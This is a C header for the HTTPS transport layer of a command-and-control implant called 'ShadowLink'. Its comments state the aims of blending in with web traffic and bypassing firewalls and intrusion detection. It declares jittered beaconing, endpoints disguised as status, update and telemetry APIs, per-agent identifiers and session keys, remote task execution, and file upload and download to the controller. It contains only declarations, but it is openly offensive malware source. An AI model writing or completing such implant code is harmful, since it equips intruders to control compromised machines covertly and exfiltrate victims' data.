/*
 * ShadowLink HTTPS Transport Layer
 * Phase 11: Stealth Communications
 * 
 * Replaces raw TCP with HTTPS to:
 * - Blend in with normal web traffic
 * - Bypass firewalls and IDS
 * - Use port 443 (trusted)
 * - Encrypt traffic with TLS
 */

#ifndef HTTPS_TRANSPORT_H
#define HTTPS_TRANSPORT_H

#include <windows.h>
#include <winhttp.h>

// Configuration
#define HTTPS_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define HTTPS_DEFAULT_PORT 443
#define HTTPS_TIMEOUT 30000  // 30 seconds

// Beacon intervals (jitter)
#define BEACON_MIN_SLEEP 5000    // 5 seconds minimum
#define BEACON_MAX_SLEEP 15000   // 15 seconds maximum
#define BEACON_JITTER_PCT 30     // 30% jitter

// HTTP endpoints (disguised as legitimate traffic)
#define ENDPOINT_CHECKIN   L"/api/v1/status"      // Initial check-in
#define ENDPOINT_TASK      L"/api/v1/updates"     // Get tasks
#define ENDPOINT_RESULT    L"/api/v1/telemetry"   // Send results
#define ENDPOINT_FILE_UP   L"/api/v1/upload"      // Upload file
#define ENDPOINT_FILE_DOWN L"/api/v1/download"    // Download file

// HTTP Methods
#define HTTP_GET  L"GET"
#define HTTP_POST L"POST"

// Connection state
typedef struct _HTTPS_CONNECTION {
    HINTERNET hSession;
    HINTERNET hConnect;
    wchar_t   szHost[256];
    INTERNET_PORT nPort;
    BOOL      bConnected;
    DWORD     dwLastError;
    char      szAgentId[64];      // Unique agent identifier
    BYTE      aesKey[32];         // Session key (received from server)
    BOOL      bHasSessionKey;
} HTTPS_CONNECTION, *PHTTPS_CONNECTION;

// Task structure from server
typedef struct _C2_TASK {
    DWORD  dwTaskId;
    char   szCommand[4096];
    DWORD  dwTimeout;
    BOOL   bExpectOutput;
} C2_TASK, *PC2_TASK;

// Result structure to send back
typedef struct _C2_RESULT {
    DWORD  dwTaskId;
    DWORD  dwStatus;       // 0 = success
    char   szOutput[65536];
    DWORD  dwOutputLen;
} C2_RESULT, *PC2_RESULT;

// ============================================
// FUNCTION PROTOTYPES
// ============================================

// Initialization
int https_init(PHTTPS_CONNECTION pConn, const wchar_t *host, INTERNET_PORT port);
void https_cleanup(PHTTPS_CONNECTION pConn);

// Connection management
int https_connect(PHTTPS_CONNECTION pConn);
void https_disconnect(PHTTPS_CONNECTION pConn);

// Beacon operations
int https_checkin(PHTTPS_CONNECTION pConn, char *response, size_t response_size);
int https_get_task(PHTTPS_CONNECTION pConn, PC2_TASK pTask);
int https_send_result(PHTTPS_CONNECTION pConn, PC2_RESULT pResult);

// File operations
int https_download_file(PHTTPS_CONNECTION pConn, const char *remote_path, const char *local_path);
int https_upload_file(PHTTPS_CONNECTION pConn, const char *local_path, const char *remote_path);

// Low-level HTTP operations
int https_request(PHTTPS_CONNECTION pConn, const wchar_t *method, const wchar_t *path,
                  const BYTE *data, DWORD data_size, 
                  BYTE *response, DWORD *response_size);

// Utilities
DWORD calculate_sleep_with_jitter(DWORD base_sleep, DWORD jitter_pct);
void generate_agent_id(char *agent_id, size_t size);

// ============================================
// CONVENIENCE ALIASES (used by agent.c)
// ============================================
#define https_close https_cleanup
#define https_beacon https_checkin

// Send simple string response
int https_send_response(PHTTPS_CONNECTION pConn, const char *response);

// Default constants
#define HTTPS_PORT HTTPS_DEFAULT_PORT
#define DEFAULT_BEACON_INTERVAL 60000

#endif // HTTPS_TRANSPORT_H
